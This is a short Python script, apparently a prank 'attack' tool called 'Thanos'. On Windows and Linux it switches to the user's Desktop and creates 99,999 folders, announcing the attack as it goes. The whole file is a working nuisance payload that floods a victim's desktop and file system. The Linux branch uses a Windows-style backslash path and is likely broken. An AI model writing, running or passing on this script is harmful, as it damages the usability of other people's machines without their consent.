from sys import platform
import os
if platform == "win32":
    print("This System Technology detected as Windows")
    wpath = os.path.expanduser('~')+"\Desktop"
    cd = os.chdir(wpath)
    path = os.getcwd()
    print("Thanos attacking on "+path)
    for i in range(1,100000):
        os.mkdir("Thanos" + str(i))
    print("Thanos attacked Successfully")
elif platform == "linux":
    print("This system is Linux")
    wpath = os.path.expanduser('~')+"\Desktop"
    cd =os.chdir(wpath)
    path = os.getcwd()
    print("Thanos attacking on "+path)
    for i in range(1,100000):
        os.mkdir("Thanos" + str(i))
    print("Thanos attacked Successfully")
